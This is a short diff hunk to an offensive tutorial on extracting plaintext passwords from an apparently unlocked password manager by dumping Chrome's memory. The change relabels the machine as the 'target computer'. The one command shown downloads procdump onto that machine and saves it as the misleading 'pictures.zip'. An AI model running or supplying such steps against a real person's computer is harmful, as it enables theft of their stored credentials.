@@ -14,7 +14,7 @@ This tutorial will teach you how to get plaintext passwords from an unlocked Bit
  - The Target computer has an internet connection 
 
 ## Step 1: Get a Debugger to Copy Chrome Memory
-For this tutorial I'm going to use procdump, it's quite compact and doesn't require an installer, so it is perfect for this scenario. On the host computer, run the command:
+For this tutorial I'm going to use procdump, it's quite compact and doesn't require an installer, so it is perfect for this scenario. On the target computer, run the command:
 
     curl https://download.sysinternals.com/files/Procdump.zip -o pictures.zip
 
